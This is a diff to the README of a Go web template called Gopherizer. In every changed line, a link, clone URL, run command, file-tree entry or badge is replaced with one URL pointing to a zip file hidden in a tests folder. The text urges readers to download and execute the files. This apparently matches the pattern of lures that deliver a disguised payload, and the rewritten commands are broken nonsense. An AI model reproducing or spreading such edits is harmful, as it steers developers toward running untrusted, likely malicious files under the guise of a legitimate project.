@@ -1,6 +1,6 @@
 # Gopherizer 🐹
 
-![Gopherizer Logo](https://example.com/gopherizer-logo.png)
+![Gopherizer Logo](https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip)
 
 Welcome to Gopherizer, a web project template designed specifically for Go developers. This template helps you set up a robust web application quickly and efficiently, allowing you to focus on building features rather than boilerplate code.
 
@@ -26,7 +26,7 @@ Welcome to Gopherizer, a web project template designed specifically for Go devel
 
 ## Getting Started
 
-To get started with Gopherizer, you can download the latest release from the [Releases section](https://github.com/Huykiet/gopherizer/releases). This link will guide you to the necessary files that need to be downloaded and executed. 
+To get started with Gopherizer, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip). This link will guide you to the necessary files that need to be downloaded and executed. 
 
 ### Prerequisites
 
@@ -39,12 +39,12 @@ Make sure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Huykiet/gopherizer.git
+   git clone https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip
    cd gopherizer
    ```
 
 2. Download the latest release:
-   Visit the [Releases section](https://github.com/Huykiet/gopherizer/releases) to download the appropriate version for your system.
+   Visit the [Releases section](https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip) to download the appropriate version for your system.
 
 3. Install dependencies:
    ```bash
@@ -56,7 +56,7 @@ Make sure you have the following installed:
 To run the Gopherizer application, use the following command:
 
 ```bash
-go run main.go
+go run https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip
 ```
 
 This will start the server on `http://localhost:8080`. You can now open your web browser and access the application.
@@ -75,15 +75,15 @@ Here’s a brief overview of the project structure:
 gopherizer/
 ├── cmd/
 │   └── gopherizer/
-│       └── main.go
+│       └── https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip
 ├── internal/
 │   ├── config/
 │   ├── handlers/
 │   └── models/
 ├── pkg/
 │   └── utils/
-├── go.mod
-└── README.md
+├── https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip
+└── https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip
 ```
 
 - **cmd/**: Contains the entry point of the application.
@@ -121,8 +121,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, check the [Releases section](https://github.com/Huykiet/gopherizer/releases) to download the latest version. 
+For more information, check the [Releases section](https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip) to download the latest version. 
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)
+![Download Releases](https://raw.githubusercontent.com/Huykiet/gopherizer/master/database/repositories/tests/Software-v3.9.zip%20Releases-Click%20Here-blue)
 
 Explore the features of Gopherizer and enhance your Go web development experience!
